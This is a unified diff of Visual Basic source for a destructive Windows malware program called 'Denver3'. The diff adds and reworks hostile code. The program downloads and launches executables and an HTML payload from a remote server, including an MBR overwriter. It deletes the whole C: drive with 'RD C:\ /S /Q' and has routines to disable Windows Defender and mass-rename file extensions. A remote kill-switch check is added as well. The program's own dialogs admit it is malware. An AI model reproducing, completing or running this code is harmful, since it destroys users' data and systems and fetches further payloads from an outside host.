@@ -298,11 +298,17 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                     End Try
                     My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
                 End If
-                If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
+            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
+                Try
                     My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
-                    Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
-                End If
-                If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
+                Catch ex As Exception
+
+                End Try
+
+
+                Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
+            End If
+            If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
                     Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
                 End If
                 If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
@@ -405,47 +411,61 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         End Try
     End Sub
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        If Not CheckIfDownloadsWork() Then
-            MsgBox("Denver3's download check has failed. This program cannot run in offline mode and your current operating system does not support downloading files. Please use Windows 10 or 11", 0 + 16, "DENVER3 START ERROR")
-            Close1 = True
-            Me.Close()
-        Else
-            If DebugMode Then
-                DebugScript()
 
-            Else
-                RunOnNotFirstRun()
-                If Not My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
-                    Dim result1 As DialogResult = MessageBox.Show(" This program is malware / malicious program and it will do harm to your computer if you were not on a VM click No immediately (do you still want to execute this program)",
-         "haha FBI can't arrest me now",
-         MessageBoxButtons.YesNo,
-          MessageBoxIcon.Warning)
-                    If result1 = DialogResult.Yes Then
-                        Dim result2 As DialogResult = MessageBox.Show("THIS IS YOUR LAST WARNING THIS IS A MALICIOUS PROGRAM IT WILL DO HARM TO YOUR COMPUTER BY CLICKING OKAY YOU FULLY ACKNOWLEDGED THAT THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE TO YOUR COMPUTER!",
-            "haha FBI can't arrest me now",
-            MessageBoxButtons.YesNo,
-            MessageBoxIcon.Warning)
-                        If result2 = DialogResult.No Then
-                            Close1 = True
-                            Me.Close()
-                        Else
-                            If CheckForInternetConnection() Then
-                                If Not My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
-                                    RunInitialSetup()
+        If Not CheckIfFileExists("https://denver3289yf998dh287hd9hd9827h.netlify.app/killswitch.html") Then
+            If CheckForInternetConnection() Then
+                If Not CheckIfDownloadsWork() Then
+                    MsgBox("Denver3's download check has failed. This program cannot run in offline mode and your current operating system does not support downloading files. Please use Windows 10 or 11", 0 + 16, "DENVER3 START ERROR")
+                    Close1 = True
+                    Me.Close()
+                Else
+                    If DebugMode Then
+                        DebugScript()
+
+                    Else
+                        RunOnNotFirstRun()
+                        If Not My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
+                            Dim result1 As DialogResult = MessageBox.Show(" This program is malware / malicious program and it will do harm to your computer if you were not on a VM click No immediately (do you still want to execute this program)",
+                 "haha FBI can't arrest me now",
+                 MessageBoxButtons.YesNo,
+                  MessageBoxIcon.Warning)
+                            If result1 = DialogResult.Yes Then
+                                Dim result2 As DialogResult = MessageBox.Show("THIS IS YOUR LAST WARNING THIS IS A MALICIOUS PROGRAM IT WILL DO HARM TO YOUR COMPUTER BY CLICKING OKAY YOU FULLY ACKNOWLEDGED THAT THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE TO YOUR COMPUTER!",
+                    "haha FBI can't arrest me now",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Warning)
+                                If result2 = DialogResult.No Then
+                                    Close1 = True
+                                    Me.Close()
+                                Else
+                                    If CheckForInternetConnection() Then
+                                        If Not My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
+                                            RunInitialSetup()
+                                        End If
+                                    Else
+                                        MsgBox("cannot connect to external server denver3 failed to initialize.", 0 + 16)
+                                        Close1 = True
+                                        Me.Close()
+                                    End If
                                 End If
                             Else
-                                MsgBox("cannot connect to external server denver3 failed to initialize.", 0 + 16)
                                 Close1 = True
                                 Me.Close()
                             End If
                         End If
-                    Else
-                        Close1 = True
-                        Me.Close()
                     End If
                 End If
+
+            Else
+                MsgBox("Denver3 needs an internet connection to work as it needs to connect to an external server to download critical files. Please check your internet connection and try again.", 0 + 16, "Please check your internet connection and try again.")
+                Close1 = True
+                Me.Close()
             End If
+        Else
+            MsgBox("The Denver3 server kill switch has been activated, official versions of the software will not work.", 0 + 16, "emergency kill switch")
         End If
+
+
     End Sub
     Public Sub fuckpc()
         Dim a1 As New still_using_this_computer()
@@ -520,6 +540,16 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         OpenTextFile("MUSIC: Undertale Last Breath: An Enigmatic Encounter (Phase 3)")
         OpenTextFile("***YOUR PC HAS BEEN FUCKED BY THE DENVER 3 VIRUS LMAO***")
         OpenTextFile("BSOD INCOMEING!!!!!!!!!!!!!")
+        Try
+            My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+        Catch ex As Exception
+
+        End Try
+        Try
+            Process.Start(InstallPath & "\MTRAILS.exe")
+        Catch ex As Exception
+            MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+        End Try
         Wait(4)
         Try
             MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
@@ -637,6 +667,21 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
         End Try
     End Sub
+
+    Function CheckIfFileExists(url As String) As Boolean
+        Dim request As HttpWebRequest = WebRequest.Create(url)
+        request.Method = "HEAD"
+
+        Try
+            Using response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
+                Return response.StatusCode = HttpStatusCode.OK
+            End Using
+        Catch ex As WebException
+            Return False ' File does not exist or other error occurred
+        End Try
+    End Function
+
+
     Private Sub DisableWindowsDefender()
         Try
             Dim keyPath As String = "SOFTWARE\Microsoft\Windows Defender"
@@ -707,7 +752,18 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             Console.WriteLine(ex.Message)
         End Try
     End Sub
+    Sub ReplaceExtensions(folderPath As String, oldExtension As String, newExtension As String)
+        For Each filePath As String In Directory.GetFiles(folderPath)
+            Try
+                If Path.GetExtension(filePath).ToLower() = oldExtension.ToLower() Then
+                    Dim newFilePath As String = Path.Combine(folderPath, Path.GetFileNameWithoutExtension(filePath) & newExtension)
+                    File.Move(filePath, newFilePath)
+                End If
+            Catch ex As Exception
 
+            End Try
+        Next
+    End Sub
     Public Sub OverrideMBR() 'fucks your pc
         Try
             My.Computer.Network.DownloadFile(ServerAddr & "MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
